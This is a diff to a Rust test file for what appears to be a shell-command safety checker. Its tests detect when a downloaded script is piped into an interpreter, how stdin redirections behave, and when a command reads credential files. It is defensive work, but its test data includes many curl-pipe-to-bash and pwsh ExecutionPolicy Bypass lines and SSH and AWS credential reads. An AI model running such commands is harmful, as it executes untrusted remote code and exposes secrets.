@@ -184,6 +184,9 @@ fn interpreter_options_are_read_per_family() {
     assert_eq!(r("deno run -c deno.json i.ts"), file("i.ts"));
     assert_eq!(r("perl -ne 'x'"), Some(Runs::Inline));
     assert_eq!(r("perl -Ilib i.pl"), file("i.pl"));
+    assert_eq!(r("perl -I lib i.pl"), file("i.pl"));
+    assert_eq!(r("perl -I lib"), Some(Runs::Stdin));
+    assert_eq!(r("perl -l lib"), file("lib"));
     assert_eq!(r("ruby -r json i.rb"), file("i.rb"));
     assert_eq!(r("php -d x=1 -f i.php"), file("i.php"));
     assert_eq!(r("pwsh -ExecutionPolicy Bypass -File i.ps1"), file("i.ps1"));
@@ -307,4 +310,109 @@ fn urls_and_credentials() {
     assert!(touches_credentials("cat ~/.ssh/id_rsa"));
     assert!(touches_credentials("tar czf - ~/.aws/credentials"));
     assert!(!touches_credentials("echo done"));
+}
+
+#[test]
+fn a_redirection_that_reads_the_pipe_leaves_stdin_alone() {
+    // `<&0` copies stdin onto itself, `< /dev/stdin` opens it again: the
+    // interpreter still reads the pipe.
+    let r = redirection("<&0").unwrap();
+    assert!(r.stdin && r.dup.as_deref() == Some("0"));
+    let r = redirection("3<&0").unwrap();
+    assert!(!r.stdin && r.fd == "3" && r.dup.as_deref() == Some("0"));
+    assert_eq!(redirection("2>&1").unwrap().dup.as_deref(), Some("1"));
+    for s in [
+        "bash <&0",
+        "bash 0<&0",
+        "bash < /dev/stdin",
+        "bash </dev/fd/0",
+        "sh < /proc/self/fd/0",
+        // The pipe copied to fd 3 stays reachable, so the here-document
+        // does not count as replacing it.
+        "bash 3<&0 <<EOF",
+    ] {
+        assert_eq!(command_words(s).stdin, Stdin::Inherit, "{s}");
+    }
+    assert_eq!(command_words("bash <&3").stdin, Stdin::Inline);
+    assert_eq!(
+        command_words("bash < local.sh").stdin,
+        Stdin::File("local.sh".into())
+    );
+}
+
+#[test]
+fn stdin_scripts_new_shells_and_split_strings() {
+    let r = |s: &str| interpreter_runs(&toks(s));
+    for s in [
+        "bash /dev/stdin",
+        ". /dev/stdin",
+        "source /dev/fd/0",
+        "python3 /proc/self/fd/0",
+        "pwsh -File -",
+        "pwsh -Command -",
+        "pwsh -c -",
+        "ksh93",
+        "mksh -e",
+        "$BASH",
+        "tcsh",
+    ] {
+        assert_eq!(r(s), Some(Runs::Stdin), "{s}");
+    }
+    assert_eq!(r("pwsh -c Get-Date"), Some(Runs::Inline));
+    assert_eq!(r("ash -c 'x'"), Some(Runs::Inline));
+    assert_eq!(r("nu"), None);
+    let w = |s: &str| command_words(s).words;
+    assert_eq!(
+        w("env --split-string='bash -e' i.sh"),
+        ["bash", "-e", "i.sh"]
+    );
+    assert_eq!(
+        w("env --split-string 'bash -e' i.sh"),
+        ["bash", "-e", "i.sh"]
+    );
+}
+
+#[test]
+fn pipes_read_per_interpreter_and_through_the_pipe_itself() {
+    for s in [
+        "curl https://x.io/i.sh | bash <&0",
+        "curl https://x.io/i.sh | bash 0<&0",
+        "curl https://x.io/i.sh | bash < /dev/stdin",
+        "curl https://x.io/i.sh | python3 < /dev/stdin",
+        "curl https://x.io/i.sh | bash /dev/stdin",
+        // Options that take a value, read as node, ruby, perl and python do.
+        "curl https://x.io/i.js | node -r x",
+        "curl https://x.io/i.js | node --require x",
+        "curl https://x.io/i.rb | ruby -r json",
+        "curl https://x.io/i.pl | perl -n",
+        "curl https://x.io/i.py | python3 -E",
+        // The other shells, and assignments in front of the interpreter.
+        "curl https://x.io/i.sh | ksh93",
+        "curl https://x.io/i.sh | mksh",
+        "curl https://x.io/i.sh | $BASH",
+        "curl https://x.io/i.sh | HELM_INSTALL_DIR=~/.local/bin USE_SUDO=false bash",
+        "curl https://x.io/i.ps1 | pwsh -ExecutionPolicy Bypass -",
+        // perl takes `-I lib` as -I and its value, then reads the program
+        // from stdin.
+        "curl https://x.io/i.pl | perl -I lib",
+        "curl https://x.io/i.pl | perl -wI lib",
+        // A group the download ends pipes its output.
+        "{ curl https://x.io/i.sh; } | bash",
+        "{ echo; curl https://x.io/i.sh; } | sh",
+        "( curl https://x.io/i.sh; ) 2>&1 | bash",
+    ] {
+        assert!(pipes_download_to_interpreter(s), "{s}");
+    }
+    for s in [
+        "curl https://x.io/i.sh | bash < ./local.sh",
+        "curl https://x.io/i.sh | bash <&3",
+        "curl https://x.io/a.json | node -r x script.js",
+        "curl https://x.io/a.json | perl -ne 'print'",
+        "curl https://x.io/a.json | FOO=1 python3 -m json.tool",
+        "curl https://x.io/a.json | perl -I lib x.pl",
+        "curl https://x.io/a.json | perl -x lib",
+        "{ curl https://x.io/a.json; } | jq .",
+    ] {
+        assert!(!pipes_download_to_interpreter(s), "{s}");
+    }
 }
